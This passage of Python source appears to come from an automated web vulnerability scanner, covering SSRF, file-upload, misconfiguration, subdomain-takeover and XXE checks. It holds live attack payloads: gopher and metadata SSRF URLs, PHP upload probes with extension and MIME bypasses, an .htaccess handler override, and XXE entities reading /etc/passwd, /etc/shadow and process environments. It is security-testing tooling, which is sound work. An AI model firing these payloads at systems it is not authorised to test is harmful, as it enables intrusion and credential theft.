            PayloadItem("gopher://127.0.0.1:27017/_",         "Gopher Mongo",      "Interact with MongoDB via Gopher"),
            PayloadItem("gopher://127.0.0.1:11211/_stats",    "Gopher Memcached",  "Memcached stats via Gopher"),
            PayloadItem("dict://127.0.0.1:11211/stats",       "Dict Memcached",    "Memcached via DICT protocol"),
            PayloadItem("sftp://127.0.0.1/",                  "SFTP probe",        "SFTP internal probe"),
            PayloadItem("ldap://127.0.0.1/",                  "LDAP probe",        "Internal LDAP server probe"),
            PayloadItem("tftp://127.0.0.1/y2s",               "TFTP probe",        "TFTP — used to exfiltrate files in some configs"),
        ]
        self.url_params = [
            'url', 'uri', 'src', 'source', 'dest', 'destination', 'redirect',
            'next', 'path', 'continue', 'return', 'callback', 'fetch',
            'proxy', 'link', 'site', 'html', 'open', 'target', 'window',
            # Extended
            'endpoint', 'api', 'host', 'domain', 'server', 'remote',
            'load', 'get', 'request', 'image', 'img', 'feed', 'resource',
            'import', 'export', 'document', 'file', 'data', 'service',
            'webhook', 'notify', 'ping', 'check', 'health', 'test',
            'feed_url', 'rss', 'atom', 'image_url', 'avatar', 'thumb',
            'wsdl', 'wadl', 'schema', 'site', 'server', 'remote_url',
        ]

    async def scan_url(self, client, url):
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            ssrf_params = {k: v for k, v in params.items() if k.lower() in self.url_params}
            if not ssrf_params:
                return vulns

            for param in list(ssrf_params.keys())[:self.config.max_params_test]:
                try:
                    baseline = await client.get(url, timeout=self.config.vuln_timeout, follow_redirects=True)
                    baseline_text = baseline.text
                except Exception:
                    continue

                for item in self.payloads:
                    try:
                        tp = params.copy()
                        tp[param] = [item.payload]
                        tq = urllib.parse.urlencode(tp, doseq=True)
                        tu = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, tq, parsed.fragment))

                        _req_t0 = time.monotonic()
                        resp = await client.get(tu, timeout=8, follow_redirects=True)
                        _req_elapsed = time.monotonic() - _req_t0
                        body = resp.text

                        ssrf_signs = [
                            r'"ami-id"', r'"instance-id"', r'"local-ipv4"',
                            r'"computeMetadata"', r'"serviceAccounts"',
                            r'root:x:0:0:', r'redis_version',
                            r'"cluster_name"', r'"name" : "elasticsearch"',
                        ]
                        for sign in ssrf_signs:
                            if re.search(sign, body, re.IGNORECASE) and not re.search(sign, baseline_text, re.IGNORECASE):
                                vulns.append(VulnerabilityResult(
                                    url=url, vulnerability_type=VulnerabilityType.SSRF,
                                    severity="CRITICAL", vulnerable_params=[param],
                                    payload_used=item.payload,
                                    evidence=f"SSRF confirmed — internal service data found in response",
                                    details=f"Parameter '{param}' fetches arbitrary URLs — SSRF confirmed",
                                    subtype=item.subtype, impact=item.impact,
                                ))
                                return vulns

                        # ── Blind SSRF: time-based — only on primary localhost/metadata probes ──
                        # Runs once per param, not on every payload (performance guard)
                        _blind_probes = {
                            "http://127.0.0.1/",
                            "http://169.254.169.254/latest/meta-data/",
                            "http://localhost/",
                        }
                        if item.payload in _blind_probes and _req_elapsed > 1.5:
                            # Compare against RFC 5737 address (never routable — fails fast)
                            _t_ext = time.monotonic()
                            try:
                                _ext_params = params.copy()
                                _ext_params[param] = ["http://192.0.2.1/"]
                                _ext_q = urllib.parse.urlencode(_ext_params, doseq=True)
                                _ext_u = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, _ext_q, parsed.fragment))
                                await client.get(_ext_u, timeout=5, follow_redirects=True)
                            except Exception:
                                pass
                            elapsed_external = time.monotonic() - _t_ext

                            if _req_elapsed > elapsed_external * 2.5:
                                vulns.append(VulnerabilityResult(
                                    url=url, vulnerability_type=VulnerabilityType.SSRF,
                                    severity="HIGH", vulnerable_params=[param],
                                    payload_used=item.payload,
                                    evidence=(
                                        f"Blind SSRF — internal {_req_elapsed:.2f}s "
                                        f"vs unreachable external {elapsed_external:.2f}s "
                                        f"({_req_elapsed/max(elapsed_external,0.01):.1f}x slower)"
                                    ),
                                    details=f"Parameter '{param}' triggers server-side HTTP request — blind SSRF",
                                    subtype="Blind SSRF (Time-based)",
                                    impact="Server makes outbound requests to internal network — may expose internal services or cloud metadata",
                                ))
                                return vulns
                    except asyncio.TimeoutError:
                        pass
                    except Exception:
                        continue
        except Exception:
            pass
        return vulns


class FileUploadScanner:
    def __init__(self, config):
        self.config = config
        self.dangerous_types = [
            ('.php',   'application/x-php',        "CRITICAL", "PHP webshell upload — full server compromise"),
            ('.php5',  'application/x-php',        "CRITICAL", "PHP5 webshell bypass"),
            ('.phtml', 'application/x-php',        "CRITICAL", "PHTML PHP bypass"),
            ('.phar',  'application/x-php',        "CRITICAL", "PHAR PHP archive bypass"),
            ('.php%00.jpg', 'image/jpeg',          "CRITICAL", "Null byte bypass — upload PHP disguised as image"),
            ('.PhP',   'application/x-php',        "HIGH",     "Case-sensitive bypass for PHP"),
            ('.asp',   'application/x-asp',        "CRITICAL", "ASP webshell upload — Windows server compromise"),
            ('.aspx',  'application/x-aspx',       "CRITICAL", "ASPX webshell upload"),
            ('.jsp',   'application/x-jsp',        "CRITICAL", "JSP webshell upload — Java server compromise"),
            ('.svg',   'image/svg+xml',            "HIGH",     "SVG XSS — JavaScript execution via SVG upload"),
            ('.html',  'text/html',                "HIGH",     "HTML upload — stored XSS via HTML file"),
            ('.xml',   'text/xml',                 "MEDIUM",   "XML upload — potential XXE injection"),
            ('.pdf',   'application/pdf',          "MEDIUM",   "PDF upload — potential JavaScript execution in PDF"),
        
            # ── Double extensions ────────────────────────────────────────────
            ('.php.jpg',  'image/jpeg',          "CRITICAL", "Double ext — .jpg whitelist bypass, PHP executes"),
            ('.jpg.php',  'image/jpeg',          "CRITICAL", "Double ext — appended .php executes"),
            ('.php%00.jpg','image/jpeg',         "CRITICAL", "Null byte bypass — extension check stops at %00"),
            # ── Alternate PHP extensions ──────────────────────────────────────
            ('.php3',  'application/x-php',      "CRITICAL", "PHP3 legacy extension"),
            ('.php4',  'application/x-php',      "CRITICAL", "PHP4 legacy extension"),
            ('.php5',  'application/x-php',      "CRITICAL", "PHP5 bypass"),
            ('.php7',  'application/x-php',      "CRITICAL", "PHP7 bypass"),
            ('.pht',   'application/x-php',      "CRITICAL", "PHT extension bypass"),
            ('.shtml', 'text/html',              "HIGH",     "SHTML SSI execution"),
            # ── .htaccess override ────────────────────────────────────────────
            ('.htaccess','text/plain',           "CRITICAL", ".htaccess — add PHP handler for any extension"),
            # ── IIS alternate extensions ──────────────────────────────────────
            ('.asa',   'application/x-asp',      "CRITICAL", "ASA extension (IIS ASP)"),
            ('.cer',   'application/x-asp',      "CRITICAL", "CER extension (IIS ASP bypass)"),
            ('.ashx',  'application/x-aspx',     "CRITICAL", "ASHX HTTP handler"),
            # ── Server-side scripts ───────────────────────────────────────────
            ('.py',    'text/plain',             "HIGH",     "Python script upload"),
            ('.pl',    'text/plain',             "HIGH",     "Perl script upload"),
            ('.sh',    'text/plain',             "HIGH",     "Shell script upload"),
            ('.rb',    'text/plain',             "HIGH",     "Ruby script upload"),
            # ── Magic bytes bypass ────────────────────────────────────────────
            ('.php',   'image/gif',              "CRITICAL", "GIF magic bytes + PHP — MIME type spoof"),
            ('.php',   'image/png',              "CRITICAL", "PNG MIME type spoof for PHP"),
]
        self.webshell_content  = b"<?php echo 'Y2S_UPLOAD_TEST_' . md5('test'); ?>"
        self.webshell_marker   = "Y2S_UPLOAD_TEST_"
        # GIF header + PHP — magic bytes spoof
        self.gif_webshell      = b"GIF89a" + b"<?php echo 'Y2S_UPLOAD_TEST_' . md5('test'); ?>"
        # SVG XSS payload
        self.svg_xss           = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert("Y2S_XSS")</script></svg>'
        # .htaccess — enables PHP for all files
        self.htaccess_pay      = b"AddType application/x-httpd-php .y2s\nOptions +ExecCGI"
        self.webshell_marker = "Y2S_UPLOAD_TEST_"

    async def scan_url(self, client, url):
        vulns = []
        try:
            resp = await client.get(url, timeout=self.config.vuln_timeout, follow_redirects=True)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            upload_forms = [f for f in forms if f.find('input', {'type': 'file'})]

            if not upload_forms:
                return vulns

            for form in upload_forms:
                action = form.get('action', url)
                method = form.get('method', 'post').lower()
                form_url = action if action.startswith('http') else urllib.parse.urljoin(url, action)
                file_input = form.find('input', {'type': 'file'})
                field_name = file_input.get('name', 'file') if file_input else 'file'
                accept = (file_input.get('accept', '') if file_input else '').lower()

                other_inputs = form.find_all('input', {'type': lambda t: t not in ['file', 'submit', 'button']})
                form_data = {inp.get('name'): inp.get('value', '') for inp in other_inputs if inp.get('name')}

                for ext, mime, severity, impact in self.dangerous_types:
                    try:
                        filename = f"y2s_test{ext}"
                        files = {field_name: (filename, self.webshell_content, mime)}

                        if method == 'post':
                            test_resp = await client.post(
                                form_url, data=form_data, files=files,
                                timeout=self.config.vuln_timeout, follow_redirects=True
                            )
                        else:
                            continue

                        body = test_resp.text
                        upload_path_patterns = [
                            r'uploads?/[^\s"\'<>]+' + re.escape(ext.split('%')[0]),
                            r'files?/[^\s"\'<>]+' + re.escape(ext.split('%')[0]),
                            r'/media/[^\s"\'<>]+' + re.escape(ext.split('%')[0]),
                        ]
                        upload_accepted = any(re.search(p, body, re.IGNORECASE) for p in upload_path_patterns)
                        error_signs = ['not allowed', 'invalid type', 'forbidden', 'blocked', 'not permitted', 'only images']
                        upload_blocked = any(s in body.lower() for s in error_signs)

                        if upload_accepted and not upload_blocked:
                            vulns.append(VulnerabilityResult(
                                url=form_url, vulnerability_type=VulnerabilityType.FILEUPLOAD,
                                severity=severity, vulnerable_params=[field_name],
                                payload_used=filename,
                                evidence=f"File with extension '{ext}' appeared accepted by server",
                                details=f"Upload form accepts potentially dangerous file type '{ext}'",
                                subtype=f"Dangerous Extension - {ext}",
                                impact=impact,
                            ))
                            break
                    except Exception:
                        continue

        except Exception:
            pass
        return vulns


class SecurityMisconfigScanner:
    def __init__(self, config):
        self.config = config
        self.sensitive_paths = [
            "/.git/config",
            "/.env",
            "/.env.local",
            "/.env.production",
            "/.env.backup",
            "/config.php",
            "/config.yml",
            "/config.yaml",
            "/wp-config.php",
            "/wp-config.php.bak",
            "/wp-config.bak",
            "/.htpasswd",
            "/.htaccess",
            "/web.config",
            "/robots.txt",
            "/sitemap.xml",
            "/phpinfo.php",
            "/info.php",
            "/test.php",
            "/admin/",
            "/admin/login",
            "/administrator/",
            "/phpmyadmin/",
            "/phpmyadmin/index.php",
            "/mysql/",
            "/_phpmyadmin/",
            "/dbadmin/",
            "/backup/",
            "/backups/",
            "/backup.sql",
            "/dump.sql",
            "/database.sql",
            "/db.sql",
            "/backup.zip",
            "/backup.tar.gz",
            "/api/v1/",
            "/api/v2/",
            "/api/docs",
            "/swagger.json",
            "/swagger/index.html",
            "/openapi.json",
            "/graphql",
            "/__debug__/",
            "/debug/",
            "/trace/",
            "/actuator",
            "/actuator/env",
            "/actuator/health",
            "/actuator/mappings",
            "/server-status",
            "/server-info",
            "/.DS_Store",
            "/thumbs.db",
            "/web.config.bak",
            "/config.bak",
            "/id_rsa",
            "/.ssh/id_rsa",
            "/package.json",
            "/composer.json",
            "/Gemfile",
            # ── Git internals ─────────────────────────────────────────────────
            "/.git/HEAD", "/.git/COMMIT_EDITMSG", "/.git/config",
            "/.git/logs/HEAD", "/.git/refs/heads/main",
            # ── CI/CD configs ─────────────────────────────────────────────────
            "/.travis.yml", "/.github/workflows/main.yml",
            "/.circleci/config.yml", "/Jenkinsfile", "/.drone.yml",
            "/.gitlab-ci.yml", "/bitbucket-pipelines.yml",
            # ── Docker / K8s ──────────────────────────────────────────────────
            "/Dockerfile", "/docker-compose.yml", "/docker-compose.yaml",
            "/.dockerignore", "/k8s.yaml", "/kubernetes.yml",
            "/deployment.yaml", "/service.yaml",
            # ── App configs ───────────────────────────────────────────────────
            "/app.py", "/settings.py", "/config.py",
            "/application.properties", "/application.yml",
            "/appsettings.json", "/appsettings.Development.json",
            # ── SSH / certs ───────────────────────────────────────────────────
            "/.ssh/authorized_keys", "/.ssh/known_hosts",
            "/id_rsa.pub", "/server.key", "/server.crt",
            # ── Log files ─────────────────────────────────────────────────────
            "/debug.log", "/error.log", "/npm-debug.log",
            "/storage/logs/laravel.log", "/var/log/app.log",
            # ── CMS configs ───────────────────────────────────────────────────
            "/sites/default/settings.php",
            "/config/database.yml", "/config/secrets.yml",
            # ── IDE configs ───────────────────────────────────────────────────
            "/.vscode/sftp.json", "/.idea/dataSources.xml",
            "/vendor/autoload.php",
        ]
        self.sensitive_signatures = {
            r"APP_KEY=|DB_PASSWORD=|SECRET_KEY=":                 ("HIGH",     ".env file exposed — contains application secrets and DB credentials"),
            r"\[core\]\s*repositoryformatversion":                ("CRITICAL", ".git/config exposed — source code may be downloadable"),
            r"<\?php\s*\$db_password|define\('DB_PASSWORD'":      ("CRITICAL", "WordPress config exposed — database credentials visible"),
            r"phpinfo\(\)":                                        ("HIGH",     "phpinfo() exposed — reveals server configuration, PHP version, and loaded modules"),
            r"MySQL.*Version|Server version:.*MySQL":              ("HIGH",     "Database version information exposed"),
            r"\"swagger\":\"2\.0\"|\"openapi\":\"3\.":             ("MEDIUM",   "API documentation exposed — reveals all endpoints and parameters"),
            r"\"query\"\s*:.*\"__typename\"":                     ("MEDIUM",   "GraphQL introspection enabled — full API schema is accessible"),
            r"environment.*=.*production|APP_ENV.*=.*prod":        ("MEDIUM",   "Environment configuration exposed"),
            r"access_token|api_key|secret_key|private_key":       ("HIGH",     "API keys or secrets found in exposed file"),
        }
        # Soft-404 indicators — server returns 200 but page is actually an error page
        self.soft_404_patterns = [
            r"\b404\b", r"not found", r"page not found", r"no such file",
            r"doesn.t exist", r"does not exist", r"couldn.t be found",
            r"cannot be found", r"nothing here", r"this page.*doesn.t exist",
            r"we couldn.t find", r"oops[,!. ]", r"the page you",
        ]

    def _is_soft_404(self, body: str) -> bool:
        b = body.lower()
        if len(body) < 50:
            return True
        return any(re.search(p, b) for p in self.soft_404_patterns)

    def _similarity(self, a: str, b: str) -> float:
        """Returns 0.0–1.0 similarity ratio between two response bodies."""
        if not a or not b:
            return 0.0
        len_a, len_b = len(a), len(b)
        if max(len_a, len_b) == 0:
            return 1.0
        size_ratio = min(len_a, len_b) / max(len_a, len_b)
        # If sizes are within 2% of each other, do a hash check
        if size_ratio > 0.98:
            import hashlib
            ha = hashlib.md5(a.strip().encode(errors='ignore')).hexdigest()
            hb = hashlib.md5(b.strip().encode(errors='ignore')).hexdigest()
            return 1.0 if ha == hb else size_ratio
        return size_ratio

    async def scan_url(self, client, url):
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"

            resp_main = await client.get(url, timeout=self.config.vuln_timeout, follow_redirects=True)
            headers = {k.lower(): v for k, v in resp_main.headers.items()}

            # ── Canary baseline: fetch a guaranteed-nonexistent URL ───────
            # Tells us exactly what a "not found" response looks like on this server
            _canary_path = f"/{uuid.uuid4().hex}_y2s_canary_probe"
            try:
                _r404 = await client.get(base + _canary_path, timeout=8, follow_redirects=True)
                _baseline_body = _r404.text
                _baseline_code = _r404.status_code
            except Exception:
                _baseline_body = ""
                _baseline_code = -1

            # Check security headers
            missing = []
            if 'x-content-type-options' not in headers:
                missing.append('X-Content-Type-Options')
            if 'x-xss-protection' not in headers:
                missing.append('X-XSS-Protection')
            if 'strict-transport-security' not in headers and parsed.scheme == 'https':
                missing.append('HSTS')
            if 'referrer-policy' not in headers:
                missing.append('Referrer-Policy')
            if 'permissions-policy' not in headers and 'feature-policy' not in headers:
                missing.append('Permissions-Policy')

            if missing:
                vulns.append(VulnerabilityResult(
                    url=url, vulnerability_type=VulnerabilityType.SECMISCONF,
                    severity="LOW", vulnerable_params=["headers"],
                    payload_used="Security header audit",
                    evidence=f"Missing headers: {', '.join(missing)}",
                    details="Multiple security headers are not configured",
                    subtype="Missing Security Headers",
                    impact="Increases attack surface for XSS, clickjacking, and MIME-type attacks",
                ))

            server = headers.get('server', '')
            x_powered = headers.get('x-powered-by', '')
            if server and any(v in server.lower() for v in ['apache/', 'nginx/', 'iis/', 'tomcat']):
                vulns.append(VulnerabilityResult(
                    url=url, vulnerability_type=VulnerabilityType.SECMISCONF,
                    severity="LOW", vulnerable_params=["headers"],
                    payload_used="Server header",
                    evidence=f"Server: {server}",
                    details="Server version disclosed in response headers",
                    subtype="Version Disclosure",
                    impact="Helps attacker identify and target known CVEs for this server version",
                ))
            if x_powered:
                vulns.append(VulnerabilityResult(
                    url=url, vulnerability_type=VulnerabilityType.SECMISCONF,
                    severity="LOW", vulnerable_params=["headers"],
                    payload_used="X-Powered-By header",
                    evidence=f"X-Powered-By: {x_powered}",
                    details="Technology stack disclosed via X-Powered-By header",
                    subtype="Technology Disclosure",
                    impact="Reveals backend technology and version for targeted exploitation",
                ))

            for path in self.sensitive_paths:
                try:
                    target = base + path
                    r = await client.get(target, timeout=8, follow_redirects=True)

                    # Skip non-200 responses
                    if r.status_code not in [200, 206]:
                        continue

                    body = r.text

                    # ── Canary comparison: same content as "not found" page? ──
                    if _baseline_code == r.status_code and _baseline_body:
                        if self._similarity(body, _baseline_body) > 0.90:
                            continue  # Server returns 200 for any URL — soft-404

                    # Pattern-based soft-404 fallback
                    if self._is_soft_404(body):
                        continue

                    # Skip if redirected to a completely different domain/path
                    final_url = str(r.url) if hasattr(r, 'url') else target
                    if parsed.netloc not in final_url:
                        continue

                    # Must match a known sensitive signature to report
                    matched = False
                    for pattern, (severity, impact) in self.sensitive_signatures.items():
                        if re.search(pattern, body, re.IGNORECASE):
                            vulns.append(VulnerabilityResult(
                                url=target, vulnerability_type=VulnerabilityType.SECMISCONF,
                                severity=severity, vulnerable_params=[path],
                                payload_used=f"GET {path}",
                                evidence=f"Sensitive file accessible at {path} — content matches '{pattern[:40]}'",
                                details=f"File '{path}' is publicly accessible and contains sensitive data",
                                subtype="Exposed Sensitive File",
                                impact=impact,
                            ))
                            matched = True
                            break

                    # For the highest-risk paths, report even without signature
                    # only if body size is substantial (real file, not error page)
                    if not matched and len(body) > 100:
                        high_risk = {
                            '/.git/config': ("CRITICAL", ".git/config exposed — git repository may be downloadable"),
                            '/.env': ("HIGH", ".env file exposed — may contain credentials and secrets"),
                            '/wp-config.php': ("CRITICAL", "wp-config.php exposed — WordPress database credentials"),
                            '/phpinfo.php': ("HIGH", "phpinfo() page exposed — server configuration disclosure"),
                            '/info.php': ("HIGH", "phpinfo() page exposed — server configuration disclosure"),
                        }
                        if path in high_risk:
                            sev, imp = high_risk[path]
                            vulns.append(VulnerabilityResult(
                                url=target, vulnerability_type=VulnerabilityType.SECMISCONF,
                                severity=sev, vulnerable_params=[path],
                                payload_used=f"GET {path}",
                                evidence=f"High-risk path returned {r.status_code} with {len(body)} bytes",
                                details=f"Sensitive path '{path}' is publicly accessible",
                                subtype="Exposed Sensitive Path",
                                impact=imp,
                            ))

                except Exception:
                    continue
        except Exception:
            pass
        return vulns



class SubdomainTakeoverScanner:

    # Each entry: (service, fingerprint, severity, require_cname)
    # require_cname=True means fingerprint alone is NOT enough — must confirm CNAME points to that service
    FINGERPRINTS = [
        # High-confidence: unique strings that only appear on that platform's error page
        ("GitHub Pages",   "There isn't a GitHub Pages site here",              "CRITICAL", False),
        ("GitHub Pages",   "For root URLs (like http://example.com/) you",      "CRITICAL", False),
        ("Heroku",         "no such app",                                        "CRITICAL", True),
        ("Heroku",         "herokucdn.com/error-pages/no-such-app",             "CRITICAL", False),
        ("Shopify",        "Sorry, this shop is currently unavailable.",         "CRITICAL", True),
        ("Fastly",         "Fastly error: unknown domain:",                      "CRITICAL", False),
        ("Ghost",          "The thing you were looking for is no longer here, but perhaps we can interest you", "HIGH", True),
        ("Surge.sh",       "project not found",                                  "CRITICAL", True),
        ("Zendesk",        "Help Center Closed",                                 "HIGH",     True),
        ("Zendesk",        "is not a valid Zendesk account",                    "HIGH",     False),
        ("Amazon S3",      "NoSuchBucket",                                       "CRITICAL", False),
        ("Amazon S3",      "The specified bucket does not exist",               "CRITICAL", False),
        ("Azure",          "404 Web Site not found",                            "CRITICAL", True),
        ("Bitbucket",      "Repository not found",                              "HIGH",     True),
        ("Cargo",          "If you're moving your domain away from Cargo",      "HIGH",     True),
        ("Desk",           "Please try again or try Desk.com free for 14 days", "HIGH",     True),
        ("HubSpot",        "Domain not configured",                             "HIGH",     True),
        ("HubSpot",        "does not exist in our system",                      "HIGH",     True),
        ("JetBrains",      "is not a registered InCloud YouTrack",              "HIGH",     False),
        ("Kinsta",         "No Site For Domain",                                "HIGH",     True),
        ("Netlify",        "Not Found - Request ID:",                           "CRITICAL", False),
        ("Pantheon",       "404 error unknown site!",                           "CRITICAL", True),
        ("Readme.io",      "Project doesnt exist... yet!",                      "HIGH",     True),
        ("Squarespace",    "No Such Account",                                   "HIGH",     True),
        ("TeamWork",       "Oops - We didn't find your site.",                  "HIGH",     True),
        ("UserVoice",      "This UserVoice subdomain is currently available!",  "CRITICAL", False),
        ("WebFlow",        "The page you are looking for doesn't exist or has been moved", "HIGH", True),
        ("WP Engine",      "The site you were looking for couldn't be found",   "HIGH",     True),
        ("Tictail",        "to target URL: https://tictail.com",                "MEDIUM",   False),
        ("Feedpress",      "The feed has not been found.",                      "MEDIUM",   True),
        ("Pingdom",        "This public report page has not been activated",    "MEDIUM",   False),
        ("Intercom",       "This page is reserved for artistic",                "MEDIUM",   True),
        ("LaunchRock",     "It looks like you may have taken a wrong turn somewhere. Anyway, let us help you get back", "MEDIUM", True),
    ]

    CNAME_SERVICES = {
        "github.io":          "GitHub Pages",
        "herokuapp.com":      "Heroku",
        "herokudns.com":      "Heroku",
        "shopify.com":        "Shopify",
        "myshopify.com":      "Shopify",
        "fastly.net":         "Fastly",
        "ghost.io":           "Ghost",
        "surge.sh":           "Surge.sh",
        "tumblr.com":         "Tumblr",
        "wordpress.com":      "WordPress.com",
        "zendesk.com":        "Zendesk",
        "s3.amazonaws.com":   "Amazon S3",
        "s3-website":         "Amazon S3",
        "cloudfront.net":     "Amazon CloudFront",
        "azurewebsites.net":  "Azure",
        "cloudapp.net":       "Azure",
        "trafficmanager.net": "Azure",
        "bitbucket.io":       "Bitbucket",
        "cargocollective.com":"Cargo",
        "desk.com":           "Desk",
        "feedpress.me":       "Feedpress",
        "fly.dev":            "Fly.io",
        "hubspot.com":        "HubSpot",
        "hs-sites.com":       "HubSpot",
        "intercom.io":        "Intercom",
        "custom.intercom.help":"Intercom",
        "kinsta.cloud":       "Kinsta",
        "launchrock.com":     "LaunchRock",
        "netlify.app":        "Netlify",
        "netlify.com":        "Netlify",
        "pantheonsite.io":    "Pantheon",
        "readme.io":          "Readme.io",
        "squarespace.com":    "Squarespace",
        "strikingly.com":     "Strikingly",
        "teamwork.com":       "TeamWork",
        "unbounce.com":       "Unbounce",
        "uservoice.com":      "UserVoice",
        "webflow.io":         "WebFlow",
        "wpengine.com":       "WP Engine",
        "tictail.com":        "Tictail",
        "pingdom.com":        "Pingdom",
    }

    def __init__(self, config: Config):
        self.config = config

    def _extract_domain(self, url: str) -> str:
        try:
            parsed = urllib.parse.urlparse(url)
            host = parsed.netloc
            parts = host.split('.')
            if len(parts) >= 2:
                return '.'.join(parts[-2:])
            return host
        except Exception:
            return ""

    def _get_subdomains(self, domain: str) -> List[str]:
        common = [
            "www", "mail", "ftp", "admin", "blog", "dev", "staging",
            "api", "portal", "shop", "store", "app", "status",
            "docs", "support", "help", "cdn", "static", "assets",
            "img", "images", "media", "news", "careers", "jobs",
            "beta", "test", "demo", "old", "legacy", "vpn",
            "remote", "webmail", "autodiscover", "m", "mobile",
        ]
        return [f"{sub}.{domain}" for sub in common]

    async def _check_dns(self, subdomain: str) -> Optional[str]:
        import socket
        try:
            loop = asyncio.get_event_loop()
            return await loop.run_in_executor(None, socket.gethostbyname, subdomain)
        except Exception:
            return None

    async def _get_cname(self, subdomain: str) -> Optional[str]:
        try:
            proc = await asyncio.create_subprocess_exec(
                "nslookup", "-type=CNAME", subdomain,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=5)
            output = stdout.decode().lower()
            for cname_domain, service in self.CNAME_SERVICES.items():
                if cname_domain in output:
                    return service
            return None
        except Exception:
            return None

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulnerabilities = []
        domain = self._extract_domain(url)
        if not domain:
            return vulnerabilities

        subdomains = self._get_subdomains(domain)

        for subdomain in subdomains:
            try:
                ip = await self._check_dns(subdomain)
                if not ip:
                    continue

                cname_service = await self._get_cname(subdomain)

                for scheme in ["https", "http"]:
                    target_url = f"{scheme}://{subdomain}"
                    try:
                        resp = await client.get(
                            target_url,
                            timeout=self.config.vuln_timeout,
                            follow_redirects=False
                        )
                        body = resp.text
                        status = resp.status_code

                        # Skip if redirects to main domain — not a takeover
                        location = resp.headers.get('location', '')
                        if location and domain in location:
                            break

                        for service, fingerprint, severity, require_cname in self.FINGERPRINTS:

                            if require_cname and cname_service != service:
                                continue

                            if fingerprint.lower() not in body.lower():
                                continue

                            # Extra sanity: status should be 4xx or 2xx with error content
                            if status not in range(400, 500) and status not in range(200, 300):
                                continue

                            # Skip if it's the main domain itself redirected here
                            final_host = urllib.parse.urlparse(str(resp.url)).netloc if hasattr(resp, 'url') else subdomain
                            if final_host and domain in final_host and subdomain not in final_host:
                                continue

                            detected_service = cname_service or service
                            vuln = VulnerabilityResult(
                                url=target_url,
                                vulnerability_type=VulnerabilityType.SDTAKEOVER,
                                severity=severity,
                                vulnerable_params=[subdomain],
                                payload_used=fingerprint,
                                evidence=f"Fingerprint matched on {detected_service}: '{fingerprint[:70]}'",
                                details=f"Subdomain '{subdomain}' appears to point to unclaimed {detected_service} resource",
                                subtype=detected_service,
                                impact=f"Attacker can claim this {detected_service} resource and serve malicious content under {subdomain}",
                            )
                            vulnerabilities.append(vuln)
                            break
                        break

                    except Exception:
                        continue

            except Exception:
                continue

        return vulnerabilities


class XXEScanner:
    """Detects XML External Entity injection vulnerabilities."""

    def __init__(self, config: Config):
        self.config = config

        # (payload, subtype, impact)
        self.payloads = [
            # ── Classic file read ─────────────────────────────────────────────
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
             "Classic XXE /etc/passwd",   "Read /etc/passwd — exposes server user accounts"),
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hosts">]><r>&x;</r>',
             "Classic XXE /etc/hosts",    "Read /etc/hosts — exposes network configuration"),
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/shadow">]><r>&x;</r>',
             "Classic XXE /etc/shadow",   "Attempt /etc/shadow — hashed passwords"),
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///proc/self/environ">]><r>&x;</r>',
             "XXE /proc/environ",         "Read process environment — may contain secrets/API keys"),
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///windows/win.ini">]><r>&x;</r>',
             "Classic XXE win.ini",       "Read Windows win.ini — confirms Windows server + config"),
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///windows/system32/drivers/etc/hosts">]><r>&x;</r>',
             "XXE Windows hosts",         "Read Windows hosts file"),
            # ── PHP wrapper ───────────────────────────────────────────────────
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><r>&x;</r>',
             "XXE PHP Wrapper index.php", "Read PHP source via php:// — exposes application logic"),
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=config.php">]><r>&x;</r>',
             "XXE PHP Wrapper config.php","Read config.php source — may expose DB credentials"),
            # ── Parameter entity (bypasses some parsers) ──────────────────────
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % f SYSTEM "file:///etc/passwd"> %f;]><r/>',
             "Parameter Entity XXE",      "XXE via parameter entity — bypasses token-based protection"),
            # ── XInclude (works when DOCTYPE is blocked) ──────────────────────
            ('<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></r>',
             "XInclude XXE",              "XInclude file read — bypasses DOCTYPE restrictions"),
            ('<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hosts"/></r>',
             "XInclude /etc/hosts",       "XInclude hosts file read"),
            # ── SVG-based XXE ─────────────────────────────────────────────────
            ('<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>',
             "SVG XXE",                   "XXE via SVG — common in image upload/processing endpoints"),
            # ── CDATA bypass ──────────────────────────────────────────────────
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r><![CDATA[]]>&x;<![CDATA[]]></r>',
             "CDATA XXE Bypass",          "CDATA wrapping to bypass content-type filters"),
            # ── Error-based ────────────────────────────────────────────────────
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///INVALID_PATH_y2s_xxe_test">]><r>&x;</r>',
             "Error-based XXE probe",     "Trigger XML parser error revealing file system path"),
            # ── SSRF via XXE ──────────────────────────────────────────────────
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&x;</r>',
